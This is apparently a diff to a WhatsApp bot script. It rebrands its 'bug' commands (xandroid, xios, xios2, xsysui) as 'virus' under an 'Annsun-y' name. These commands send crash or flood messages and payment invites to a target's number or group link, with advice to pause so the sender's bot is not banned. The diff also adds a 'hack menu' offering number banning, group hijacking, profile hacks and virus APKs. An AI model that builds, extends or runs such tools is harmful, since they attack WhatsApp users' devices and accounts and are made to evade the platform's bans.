@@ -1088,9 +1088,9 @@ senddocu(buffer)
                 if (!m.isGroup) return replygcxeon(mess.group)
                 if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
-                let teks = `*👥 Tag All*
+                let teks = `*☠️Annsun-y Tag All*
  
-                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
+                 👾 *Message : ${q ? q : 'blank'}*\n\n`
                 for (let mem of participants) {
                     teks += `• @${mem.id.split('@')[0]}\n`
                 }
@@ -2095,8 +2095,8 @@ case "xandroid": {
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "Successfully Sent virus To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* 💀\n\nPause 2 minutes so that the is not banned.", 
     [whatsappNumber]
   );
 }
@@ -2127,8 +2127,8 @@ case "xios": {
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "Successfully Sent virus To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the  is not banned.", 
     [whatsappNumber]
   );
 }
@@ -2179,7 +2179,7 @@ case "xios2":
     if (!text) {
       return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
     }
-    replygcxeon("please wait, " + command + " bug is in process..");
+    replygcxeon("please wait, " + command + " Virus is in process.. `CREATED BY ANNSUN-Y`");
     if (!text.split(" ")[0].includes("whatsapp.com")) {
       return replygcxeon("Link Invalid!");
     }
@@ -2250,13 +2250,13 @@ case "xsysui": {
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " virus is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "Successfully Sent virus To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the  is not banned.", 
     [whatsappNumber]
   );
 }
@@ -2272,25 +2272,25 @@ break
             case 'menu':
             case 'help':
             case 'alive':
-            case '?':
+            case '.':
             case 'allmenu':
                 let xeonmenuoh = `Hello ${pushname}
 ╰┈➤ ${xeonytimewisher} 😄
 ${readmore}
-╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
+╰┈➤ ᴠɪʀᴜꜱ ᴀɴᴅʀᴏɪᴅ
 > xandroid 
 > xandroid2
 > systemuicrash
 > xsysui
 
-╰┈➤ ʙᴜɢ ɪᴏꜱ
+╰┈➤ ʙᴜɢ,ᴠɪʀᴜꜱ ɪᴏꜱ 
 > xios
 > xios2
 
 ╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
 > xgc
 
-╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
+╰┈➤ ᴀɴɴꜱᴜɴ-ʏ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
 > getsession
 > deletesession
 > join
@@ -2326,7 +2326,7 @@ ${readmore}
 > editinfo
 > linkgc
 > revoke
-> listonline
+> Admin hack
 
 ╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ
 > menu
@@ -2352,28 +2352,28 @@ ${readmore}
 > fliptext
 > emojimix
 
-╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
-> addvideo
-> addimage
-> addsticker
-> addvn
-> addzip
-> addapk
-> addpdf
-> delvideo
-> delimage
-> delsticker
-> delvn
-> delzip
-> delapk
-> delpdf
-> listvideo
-> listimage
-> liststicker
-> listvn
-> listzip
-> listapk
-> listpdf
+╰┈➤ ʜᴀᴄᴋ ᴍᴇɴᴜ
+> number bannd
+> whatsapp code hack
+> Group hijack
+> link bannd
+> wa report 
+> group report
+> others bot bug 
+> img virus
+> audio virus
+> group End 
+> add number
+> group link hack
+> antispam 
+> antibad 
+> device info
+> device code
+> profile hack
+> audio file 
+> png file
+> virus apk
+> apk check
 
 ╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
 > play
